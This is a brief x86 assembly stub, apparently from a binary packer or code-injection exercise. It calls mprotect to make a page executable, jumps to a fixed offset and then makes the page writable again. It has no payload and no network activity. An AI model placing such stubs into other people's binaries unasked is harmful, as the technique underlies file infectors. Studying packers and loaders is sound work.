default rel
global _start
_start:
	pusha

	mov edx, 0x5; EXEC | READ
	mov ecx, 0x105D; size shell code + 1 page, modulable (ou non ?)
p1:
	lea ebx, [edi + 0x2E7C - (p1 - _start)]
	and ebx, 0xFFFFF000
	mov eax, 0x7d
	int 0x80

p2:
	jmp 0x2e7c - (p2 - _start)

	mov edx, 0x3; WRITE | READ
	mov ecx, 0x105D; size shell code + 1 page, modulable (ou non ?)
p3:
	lea ebx, [edi + 0x2E7C - (p3 - _start)]
	and ebx, 0xFFFFF000
	mov eax, 0x7d
	int 0x80
	popa
